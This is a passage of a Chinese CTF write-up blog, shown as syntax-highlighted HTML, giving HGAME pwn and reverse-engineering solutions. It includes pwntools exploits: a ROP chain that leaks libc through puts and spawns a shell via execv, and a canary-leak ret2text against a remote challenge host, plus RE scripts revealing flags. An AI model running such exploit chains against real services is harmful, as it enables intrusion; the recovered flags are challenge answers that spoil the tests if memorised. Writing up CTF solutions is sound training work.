puts_plt &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4010A0&lt;/span&gt;
test_thread &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4011D6&lt;/span&gt;
main &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4012A3&lt;/span&gt;
ret &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x40101a&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# gdb.attach(p, &amp;#39;thread 2\nb *0x401245&amp;#39;)&lt;/span&gt;
pre_payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x28&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;c&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;b&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;
payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(pop_rdi_ret) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p64(puts_got) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p64(puts_plt) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p64(test_thread)

p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(pre_payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;c&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x900&lt;/span&gt;)
print (p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline())
puts_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; u64(p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()[:&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)

puts_offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x875A0&lt;/span&gt;
binsh_offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1B75AA&lt;/span&gt;
execv_offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE6450&lt;/span&gt;

libc_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; puts_addr &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; puts_offset
binsh_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; libc_addr &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; binsh_offset
execv_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; libc_addr &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; execv_offset

payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p64(ret) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p64(pop_rdi_ret) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p64(binsh_addr) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p64(pop_rsi_r15_ret) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p64(execv_addr)
p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(pre_payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; payload &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;c&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x900&lt;/span&gt;)

p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;此外，这题还学到了 gdb 调试 threads 的技巧
&lt;code&gt;info threads&lt;/code&gt; 可以查看当前的线程，&lt;code&gt;thread i&lt;/code&gt; 可以切换到第 i 个线程&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;pwntest_your_gdb&#34;&gt;[Pwn]test_your_gdb&lt;/h3&gt;
&lt;p&gt;先调试拿到 password，然后就是简单的 ret2text 了&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;

context(os&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;linux&amp;#39;&lt;/span&gt;, arch&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;amd64&amp;#39;&lt;/span&gt;, log_level&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;# p = process(b&amp;#39;./a.out&amp;#39;)&lt;/span&gt;
p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;chuj.top&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;50748&lt;/span&gt;)

payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x47\xf1\x94\x82\x0e\x1e\x36\xb0\xa9\xa6\xd8\x4e\xc3\xe0\x09\x8c&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# gdb.attach(p)&lt;/span&gt;
p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pass word&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send(payload)
p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recv(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x18&lt;/span&gt;)
canary &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recv(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;)
p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recv(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x100&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;)
payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x18&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; canary &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;b&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x401256&lt;/span&gt;)
p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(payload)

p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;week2&#34;&gt;Week2&lt;/h2&gt;
&lt;h3 id=&#34;rexd-maze&#34;&gt;[RE]xD MAZE&lt;/h3&gt;
&lt;p&gt;一维的迷宫，直接用 vscode 的小技巧转成 flag&lt;/p&gt;
&lt;p&gt;选中 512 个 &lt;code&gt;#&lt;/code&gt; 和后面的一个空格，然后 &lt;code&gt;CTRL+SHIFT+L&lt;/code&gt; 全选，换成 &lt;code&gt;3&lt;/code&gt;，以此类推&lt;/p&gt;
&lt;h3 id=&#34;reupx-magic-0&#34;&gt;[RE]upx magic 0&lt;/h3&gt;
&lt;p&gt;把所有可见字符都算一遍，然后映射回去就行&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;crc&lt;/span&gt;(x):
    x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8000&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
            x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (x &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1021&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
            x &lt;span style=&#34;color:#f92672&#34;&gt;*=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
        x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xffff&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; x

a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x80&lt;/span&gt;):
    a&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(crc(i))

cipher &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8D68&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9D49&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2A12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xAB1A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xCBDC&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB92B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2E32&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9F59&lt;/span&gt;, 
  &lt;span style=&#34;color:#ae81ff&#34;&gt;0xDDCD&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9D49&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA90A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE70&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF5CF&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA50&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5AF5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFF9F&lt;/span&gt;, 
  &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9F59&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xBD0B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x58E5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3823&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xBF1B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x78A7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xAB1A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x48C4&lt;/span&gt;,
  &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA90A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2C22&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9F59&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5CC5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5ED5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x78A7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2672&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5695&lt;/span&gt;
]

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; cipher:
    print (chr(a&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;index(c)), end&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# noW_YOu~koNw-UPx~mAG|C_@Nd~crC16&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;reupx-magic-1&#34;&gt;[RE]upx magic 1&lt;/h3&gt;
&lt;p&gt;发现没法自动脱壳，010 打开之后，手动把三个 &lt;code&gt;UPX?&lt;/code&gt; 改成 &lt;code&gt;UPX!&lt;/code&gt;，之后就能自动脱壳了&lt;/p&gt;
&lt;h3 id=&#34;refake-shell&#34;&gt;[RE]fake shell&lt;/h3&gt;
&lt;p&gt;RC4 + init 更换密钥&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;target &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x94&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xFA&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x5F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE0&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0xEA&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x66&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x98&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE7&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x08&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x40&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x71&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xBE&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6D&lt;/span&gt;,
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7C&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x09&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xBD&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF6&lt;/span&gt;
]

&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; Crypto.Cipher &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; ARC4

rc4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ARC4&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;new(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;w0wy0ugot1t&amp;#39;&lt;/span&gt;)

rc4&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decrypt(bytes(target))

&lt;span style=&#34;color:#75715e&#34;&gt;# b&amp;#39;hgame{s0meth1ng_run_bef0r_m4in?}&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;或者直接动调也行&lt;/p&gt;
&lt;h3 id=&#34;recreakme2&#34;&gt;[RE]creakme2&lt;/h3&gt;
&lt;p&gt;在加密函数里看一下汇编，发现用了 try except 来构造了一个除 0 异常，当最高位为 0 时，异或一个 0x1234567&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdint.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;encipher&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; num_rounds, &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt; v[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;], &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; key[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;]) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt; v0&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;v[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;], v1&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;v[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], sum&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, delta&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x9E3779B1&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (i&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; num_rounds; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        v0 &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; (((v1 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (v1 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v1) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (sum &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; key[sum &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;]);
        sum &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; delta;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (sum &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
            sum &lt;span style=&#34;color:#f92672&#34;&gt;^=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1234567&lt;/span&gt;;
        printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%x&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, sum);
        v1 &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; (((v0 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (v0 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v0) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (sum &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; key[(sum&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;]);
    }
    v[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;v0; v[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;v1;
    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%x&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, sum);
}

